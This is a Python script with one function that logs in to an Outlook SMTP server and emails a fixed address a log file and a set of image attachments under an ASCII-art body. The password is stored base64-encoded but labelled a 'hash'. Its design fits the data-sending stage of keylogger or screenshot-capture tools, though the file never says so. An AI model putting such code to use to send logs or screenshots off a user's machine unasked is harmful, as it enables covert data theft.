import smtplib, ssl
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
import subprocess
import base64

port = 587
smtp_server = "smtp-mail.outlook.com"
sender = "EXAMPLE@outlook.com" 
recipient = "EXAMPLE@gmail.com"
password = "RVhBTVBMRUhBU0g=" #EXAMPLE HASH PASSWORD
sender_password = base64.b64decode(password).decode('utf-8')

def send_email(subject, image_list, log_file):
    message = MIMEMultipart('mixed')
    message['From'] = sender
    message['To'] = recipient
    message['CC'] = None
    message['Subject'] = subject

    msg_content = r'''<html>
    <div style="font-family: monospace; white-space: pre;">
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠤⠔⠒⠒⠦⠄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠚⠁⠀⠀⠀⠀⠀⠀⠀⠀⠉⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣠⣤⣤⡄⠀⠀⠀⠀⠀⣸⠁⠀⠀⣀⠀⠀⠀⠀⠀⠀⣀⠀⠀⢹⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⣏⣀⣤⣾⡄⠀⠀⠀⢠⡇⡰⠲⣯⣀⣀⡀⠀⠀⣀⣀⣤⠷⠲⡀⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢹⠯⣤⣞⣳⡀⠀⠀⢸⠀⣇⠀⠀⠀⠉⠉⢉⠉⢉⡉⠀⠀⠀⡇⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢷⠧⣴⣏⣇⠀⠀⢸⠀⢹⠒⣦⣤⣄⣀⣥⣖⣉⣤⣤⠔⢺⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⡟⢠⡴⣿⡆⠀⢸⠀⢸⡀⠙⢭⣽⣾⣀⣼⣿⣭⠝⠁⣸⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢱⡛⣲⠯⣽⡄⢸⠀⠏⢱⠴⠊⠁⠀⠀⠀⠈⠉⠲⣴⠙⠀⣸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢳⣳⣞⣷⣷⣸⡇⣞⠁⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⢹⠀⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣈⠿⣟⣫⢭⡟⠣⠸⣦⠀⠀⠀⠈⠉⠉⠀⠀⠀⢀⣾⢠⠛⣦⢄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣀⣴⠿⢤⣼⡃⠀⠈⢧⠀⠀⠳⡱⣄⠀⠀⠀⢀⣿⣿⣤⣿⠃⠀⢠⠇⠀⠀⡿⠤⠤⣤⣀⡀⠀⠀⠀⠀⠀⠀
⠀⠀⢘⣿⠶⣄⠀⣿⣇⠀⠀⠀⠳⣀⠀⠈⠙⠓⠦⢤⣿⡟⣻⠟⠁⢀⡠⠃⠀⠀⣰⠃⠀⢀⠾⢿⣻⠀⠀⠀⠀⠀⠀
⠀⢀⡾⠁⠀⠈⢧⣼⡟⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⢻⠁⠙⡇⠀⠈⠀⠀⠀⣰⠃⠀⢠⡏⠀⠀⠹⡆⠀⠀⠀⠀⠀
⠀⢸⡇⠀⠀⠀⠈⣧⢣⠙⢦⠀⠀⠀⠀⠀⠀⠀⠀⡸⡞⠀⠛⣇⣀⠀⠀⠀⡴⠃⠀⠀⡞⠀⠀⠀⠀⣿⡄⠀⠀⠀⠀
⢀⡟⢧⠀⠀⣀⠤⠾⡈⢆⠈⠙⢦⣀⠀⠀⠀⠀⢰⣧⣤⡦⠶⠧⠼⢤⣠⠞⠁⠀⠀⢸⠧⣄⡀⠀⠀⢸⠹⡄⠀⠀⠀
⣼⠀⠘⡆⠊⡀⠀⠀⠙⣌⢢⡀⠀⠈⠙⢶⣒⡶⠋⠙⡌⢧⠀⠀⠀⠚⠳⡄⠀⠀⠀⣾⠎⠀⠙⠀⠀⠀⢧⢹⡀⠀⠀
⡏⠀⠀⠀⡰⠀⠀⠀⠀⢸⣄⢑⣄⠀⢀⡠⢿⡱⡀⠀⡽⣸⣄⣷⠴⡄⢰⡇⠀⠀⢠⠃⠀⠀⠀⢰⠀⠀⠀⠉⢧⠀⠀
⣧⢠⠀⠀⣇⣠⣤⠖⠋⠉⠁⠀⠀⠀⠀⠀⠈⢧⠑⣴⠃⡿⠤⡽⠒⠒⠋⠀⠀⠀⣾⠀⠀⠀⠀⠈⡆⠀⠀⠘⣼⡀⠀
⢹⢸⠀⢀⣽⡇⢸⠀⠀⠀⠀⠀⠀⠀⢀⡠⠂⠀⠳⣌⣾⡦⣞⠁⠀⠀⠀⠀⠀⠀⢻⠀⠀⢀⣴⡚⠳⣄⠀⠀⠘⡇⠀
⠀⢻⡇⠸⠁⢧⠀⢇⠀⠀⣀⡠⠴⠚⠉⠀⠀⠀⢠⠟⠉⠀⠀⠙⢦⡀⠀⠀⠀⢀⡸⠗⠉⠀⠀⠱⡀⠹⡉⠳⠄⢸⠀
⠀⠈⡇⠀⠀⠈⢧⡈⢦⠀⠀⠀⠀⠀⠀⠀⢀⡴⢛⣟⡭⠿⠿⠿⢿⡿⡿⠖⠒⠉⠀⠀⠀⠀⠀⠀⢣⠀⡇⠀⠀⠘⡇
⠀⠀⣷⠀⠀⠀⠈⠳⣄⠑⢄⡀⠀⣀⠤⢺⠿⢂⣎⡏⠀⠀⠀⠀⠀⢹⣽⡄⠀⣀⣀⣀⠀⣀⣀⡀⠸⠀⠀⠀⠀⢠⠇
⠀⠀⠘⠷⣄⣀⣀⣀⣉⣷⠤⠽⠋⠁⢠⡧⠔⣻⡏⣇⠀⠀⠀⠀⠀⠀⡇⡇⠀⠀⠀⠀⠀⠀⠀⠀⢀⠃⠀⢀⡴⠋⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡤⠚⠁⣴⣜⠦⣤⣤⣤⣤⣴⣧⢇⣀⡀⠀⠀⠀⢀⣀⣀⣼⣀⠟⠉⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⠢⠤⠤⠛⠉⠉⠉⠉⠉⠁⠁⠀⠀⠈⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠀⠖⠒⠒⠒⠀⠀⠀⠀⠠⣀⠀⢀⠀⡀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                           
</div>
</html>
'''

    body = MIMEText(msg_content, 'html')
    message.attach(body)

    try:
        with open(log_file, "rb") as attachment:
            p = MIMEApplication(attachment.read(), _subtype="txt")
            p.add_header('Content-Disposition', "attachment; filename=%s.txt" % log_file)
            message.attach(p)
    except Exception as e:
        print(str(e))

    try:
        for s in image_list:
            with open(s, "rb") as attachment:
                p = MIMEApplication(attachment.read(), _subtype="png")
                p.add_header(f'Content-Disposition', "attachment; filename=%s" % s)
                message.attach(p)
    except Exception as e:
        print(str(e))

    msg_full = message.as_string()

    with smtplib.SMTP(smtp_server, port) as server:
        server.ehlo()
        server.starttls()
        server.ehlo()
        server.login(sender, sender_password)
        server.sendmail(sender, recipient, msg_full)

        server.quit()

    print("email sent out successfully")


